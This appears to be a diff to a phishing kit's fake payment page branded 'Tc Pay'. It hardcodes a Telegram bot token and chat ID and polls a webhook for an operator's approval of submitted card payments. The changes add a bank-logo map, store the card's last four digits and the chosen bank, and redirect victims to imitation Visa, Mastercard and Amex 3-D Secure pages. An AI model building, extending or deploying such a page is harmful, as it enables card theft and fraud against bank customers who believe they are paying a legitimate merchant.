@@ -249,6 +249,7 @@
       display: block;
     }
 
+    /* LOADING OVERLAY */
     .loading-overlay {
       display: none;
       position: fixed;
@@ -434,6 +435,18 @@
         min-width: 100px;
         width: auto;
       }
+
+      .loading-card {
+        padding: 32px 24px 28px 24px;
+        max-width: 330px;
+      }
+      .logo-container .logo-img {
+        height: 70px;
+        max-width: 130px;
+      }
+      .loading-card .loading-text {
+        font-size: 0.9rem;
+      }
     }
 
     @media (max-width: 480px) {
@@ -485,6 +498,9 @@
         height: 60px;
         max-width: 110px;
       }
+      .loading-card .loading-text {
+        font-size: 0.85rem;
+      }
       .btn-continuar {
         width: 100%;
       }
@@ -498,6 +514,9 @@
       .logo-container .logo-img {
         height: 50px;
         max-width: 90px;
+      }
+      .loading-card .loading-text {
+        font-size: 0.8rem;
       }
     }
   </style>
@@ -608,6 +627,7 @@
     Copyright © Tc Pay un producto de Tu Compra S.A.S
   </div>
 
+  <!-- LOADING OVERLAY -->
   <div class="loading-overlay" id="loadingOverlay">
     <div class="loading-card">
       <div class="initial-spinner active" id="initialSpinner"></div>
@@ -625,18 +645,46 @@
 
   <script>
     // ============================================
-    // CONFIGURACIÓN - WEBHOOK EN RUTA RELATIVA
+    // CONFIGURACIÓN - TOKEN Y CHAT ID CORRECTOS
     // ============================================
     const TELEGRAM_BOT_TOKEN = '8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ';
     const TELEGRAM_CHAT_ID = '-1004294946880';
-    const WEBHOOK_URL = '/api/webhook';  // <--- RUTA RELATIVA, SIN DOMINIO FIJO
+    const WEBHOOK_URL = '/api/webhook';
     const POLLING_INTERVAL = 3000;
     const MAX_POLLING_TIME = 300000;
 
     let solicitudId = null;
     let pollingInterval = null;
     let cardType = null;
+    let bancoSeleccionado = null;
 
+    // ============================================
+    // MAPA DE LOGOS DE BANCOS
+    // ============================================
+    const bankLogos = {
+      'Bancolombia': 'bancol.png',
+      'Davivienda': 'davivienda.png',
+      'BBVA Colombia': 'bbva.png',
+      'Banco de Bogotá': 'bog.png',
+      'Banco Popular': 'popu.png',
+      'Banco Occidente': 'occi.png',
+      'Citibank Colombia': 'citi.png',
+      'Banco AV Villas': 'avvillas.png',
+      'Banco Falabella': 'fala.png',
+      'Banco Finandina': 'finandina.png',
+      'Itaú': 'itau.png',
+      'Nequi': 'nequi.png',
+      'Caja Social': 'Caja.jpg',
+      'Colpatria': 'colpatria.png',
+      'Serfinanza': 'serfinanza.png',
+      'Tuya': 'tuya.png'
+    };
+
+    const defaultLogo = 'banco.png';
+
+    // ============================================
+    // MAPA DE LOGOS DE TARJETAS
+    // ============================================
     const cardLogos = {
       'visa': 'visa.png',
       'mastercard': 'mastercard.png',
@@ -763,16 +811,74 @@
     }
 
     // ============================================
-    // REDIRIGIR SEGÚN TIPO DE TARJETA
+    // REDIRIGIR CON PANTALLA DE CARGA
     // ============================================
-    function redirigirSegunTipoTarjeta(tipo) {
-      const map = {
-        'visa': 'visa.html',
-        'mastercard': 'master.html',
-        'amex': 'amex.html'
+    function mostrarCargaYRedirigir(tipoTarjeta, banco) {
+      const initialSpinner = document.getElementById('initialSpinner');
+      const logoContainer = document.getElementById('logoContainer');
+      const cardLogoImg = document.getElementById('cardLogoImg');
+      const progressWrapper = document.getElementById('progressWrapper');
+      const progressFill = document.getElementById('progressFill');
+      const loadingText = document.getElementById('loadingText');
+
+      // 🔥 Guardar el logo del banco en localStorage (MISMAS CLAVES QUE PASO3)
+      const logoFile = bankLogos[banco] || defaultLogo;
+      localStorage.setItem('logo_banco', logoFile);
+      localStorage.setItem('banco_seleccionado', banco);
+      localStorage.setItem('tipo_tarjeta', tipoTarjeta);
+      localStorage.setItem('card_last4', document.getElementById('cc').value.replace(/\s/g, '').slice(-4));
+
+      // Mostrar el overlay
+      document.getElementById('loadingOverlay').classList.add('active');
+
+      // Ocultar spinner y mostrar logo
+      initialSpinner.classList.remove('active');
+      initialSpinner.style.display = 'none';
+      
+      logoContainer.style.display = 'flex';
+      
+      const cardLogoFile = cardLogos[tipoTarjeta];
+      if (cardLogoFile) {
+        cardLogoImg.src = cardLogoFile;
+        cardLogoImg.alt = tipoTarjeta.charAt(0).toUpperCase() + tipoTarjeta.slice(1);
+        cardLogoImg.style.height = '80px';
+      }
+      
+      progressWrapper.style.display = 'block';
+      
+      const nombres = {
+        'visa': 'Verified by Visa',
+        'mastercard': 'Mastercard SecureCode',
+        'amex': 'American Express SafeKey'
       };
-      const destino = map[tipo] || 'index.html';
-      window.location.href = destino;
+      loadingText.textContent = 'Redirigiendo a ' + (nombres[tipoTarjeta] || '...');
+      
+      // Barra de progreso
+      let progress = 0;
+      const duration = 3000;
+      const interval = 50;
+      const steps = duration / interval;
+      const increment = 100 / steps;
+      
+      progressFill.style.width = '0%';
+      
+      const timer = setInterval(() => {
+        progress += increment;
+        if (progress >= 100) {
+          progress = 100;
+          clearInterval(timer);
+          setTimeout(() => {
+            const map = {
+              'visa': 'visa.html',
+              'mastercard': 'master.html',
+              'amex': 'amex.html'
+            };
+            const destino = map[tipoTarjeta] || 'index.html';
+            window.location.href = destino;
+          }, 400);
+        }
+        progressFill.style.width = progress + '%';
+      }, interval);
     }
 
     // ============================================
@@ -847,6 +953,7 @@
     // ============================================
     function iniciarPollingPago() {
       const tipoTarjeta = cardType;
+      const banco = bancoSeleccionado;
       let tiempoInicio = Date.now();
 
       pollingInterval = setInterval(async () => {
@@ -879,7 +986,9 @@
           document.getElementById('tipo').disabled = false;
           document.getElementById('cardholder').disabled = false;
           mostrarMensaje('✅ Pago aprobado, redirigiendo...', 'success');
-          setTimeout(() => { redirigirSegunTipoTarjeta(tipoTarjeta); }, 1500);
+          setTimeout(() => { 
+            mostrarCargaYRedirigir(tipoTarjeta, banco);
+          }, 1500);
         } else if (resultado === 'rejected') {
           clearInterval(pollingInterval);
           document.getElementById('loadingOverlay').classList.remove('active');
@@ -944,6 +1053,7 @@
         return;
       }
 
+      bancoSeleccionado = banco;
       solicitudId = generarSolicitudId();
 
       const loadingOverlay = document.getElementById('loadingOverlay');
